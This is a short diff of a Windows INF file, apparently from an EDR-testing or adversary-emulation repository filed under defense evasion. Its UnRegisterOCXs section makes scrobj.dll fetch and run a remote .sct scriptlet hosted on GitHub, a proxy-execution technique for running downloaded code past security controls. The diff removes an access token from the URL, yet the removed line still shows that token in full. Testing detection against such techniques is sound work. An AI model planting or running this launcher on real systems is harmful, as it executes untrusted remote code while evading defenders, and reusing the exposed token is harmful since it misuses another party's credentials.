@@ -6,7 +6,7 @@ AdvancedINF=2.5
 UnRegisterOCXs=UnRegisterOCXSection
 
 [UnRegisterOCXSection]
-%11%\scrobj.dll,NI,https://raw.githubusercontent.com/0d4rk30/EDR.CTC/main/defense.evasion/T1218.001/T1218.011.sct?token=GHSAT0AAAAAACSM2SFLUFRZSZGXGTV4574QZSGRBLA
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/0d4rk30/EDR.CTC/main/defense.evasion/T1218.001/T1218.011.sct
 
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
